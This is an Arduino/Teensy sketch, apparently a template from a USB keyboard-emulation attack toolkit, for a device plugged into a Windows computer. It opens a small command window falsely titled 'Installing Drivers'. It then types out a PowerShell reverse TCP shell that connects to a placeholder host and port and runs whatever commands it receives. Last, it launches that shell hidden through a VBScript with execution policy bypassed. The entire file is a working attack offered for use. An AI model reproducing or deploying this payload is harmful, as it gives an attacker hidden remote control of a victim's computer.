#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  delay(1000);
  Keyboard.println("echo $cl = New-Object System.Net.Sockets.TCPClient(\"INPUT0\",INPUT1)  > %temp%\\rtcp.ps1");
  Keyboard.println("echo $str = $cl.GetStream() >> %temp%\\rtcp.ps1");
  Keyboard.println("echo [byte[]]$bts = 0..65535^|%{0}  >> %temp%\\rtcp.ps1");
  Keyboard.println("echo while(($i = $str.Read($bts, 0, $bts.Length)) -ne 0){  >> %temp%\\rtcp.ps1");
  Keyboard.println("echo $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bts,0, $i)  >> %temp%\\rtcp.ps1");
  Keyboard.println("echo $sb = (iex $data 2>&1 ^| Out-String )  >> %temp%\\rtcp.ps1");
  Keyboard.println("echo $sb2  = $sb + \"PS \" + (pwd).Path + \"> \"  >> %temp%\\rtcp.ps1");
  Keyboard.println("echo $sbt = ([text.encoding]::ASCII).GetBytes($sb2)  >> %temp%\\rtcp.ps1");
  Keyboard.println("echo $str.Write($sbt,0,$sbt.Length) >> %temp%\\rtcp.ps1");
  Keyboard.println("echo $str.Flush()} >> %temp%\\rtcp.ps1");
  Keyboard.println("echo $cl.Close() >> %temp%\\rtcp.ps1");
  
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\rtcp.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\rtcp.ps1\"),0,true >> %temp%\\rtcp.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\rtcp.vbs");
  delay(1000);
  Keyboard.println("exit");

}

void loop(){
}

 DEFS
